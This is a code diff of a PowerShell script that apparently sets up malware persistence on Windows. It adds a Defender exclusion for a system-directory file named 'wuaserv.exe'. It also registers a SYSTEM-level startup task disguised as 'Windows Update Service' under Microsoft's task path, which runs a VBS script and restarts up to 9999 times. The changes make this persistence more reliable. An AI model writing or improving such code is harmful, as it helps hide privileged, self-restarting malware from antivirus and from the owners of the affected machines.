@@ -91,30 +91,42 @@ foreach ($file in $hiddenFiles) {
 # Add Defender exclusion for wuaserv.exe only
 Add-MpPreference -ExclusionPath "$sysDir\wuaserv.exe" -ErrorAction SilentlyContinue
 
-# Create scheduled task
-$action = New-ScheduledTaskAction -Execute "$sysDir\wscript.exe" -Argument "$sysDir\slmgr2.vbs"
+if (-not (Test-Path $scriptPath)) {
+    Write-Error "Script file not found: $scriptPath"
+    exit
+}
+
+# Create scheduled task components
+$action = New-ScheduledTaskAction -Execute "$sysDir\wscript.exe" -Argument "`"$scriptPath`""
 $trigger = New-ScheduledTaskTrigger -AtStartup
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 9999
 $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings
 
-# Register task
+$taskName = "Windows Update Service"
+$taskPath = "\Microsoft\Windows\"
+
+# Register the scheduled task
 try {
-    Register-ScheduledTask -TaskName "Windows Update Service" -TaskPath "\Microsoft\Windows\" -InputObject $task -ErrorAction Stop
-    Write-Host "Task registered successfully"
+    Register-ScheduledTask -TaskName $taskName -TaskPath $taskPath -InputObject $task -Force -ErrorAction Stop
+    Write-Host "Task registered successfully."
 } catch {
-    Write-Error "Task registration failed: $_"; exit
+    Write-Error "Task registration failed: $_"
+    exit
 }
 
-# Verify task exists
-if (-not (Get-ScheduledTask -TaskName "Windows Update Service" -ErrorAction SilentlyContinue)) {
-    Write-Error "Failed to verify task registration"; exit
+# Verify task exists using full path
+if (-not (Get-ScheduledTask -TaskPath $taskPath -TaskName $taskName -ErrorAction SilentlyContinue)) {
+    Write-Error "Failed to verify task registration."
+    exit
 }
 
-# Start task after delay
+# Optional delay before starting
 Start-Sleep -Seconds 5
+
+# Attempt to start the task
 try {
-    Start-ScheduledTask -TaskName "Windows Update Service" -ErrorAction Stop
+    Start-ScheduledTask -TaskPath $taskPath -TaskName $taskName -ErrorAction Stop
     Write-Host "Task started successfully!"
 } catch {
     Write-Error "Failed to start task: $_"
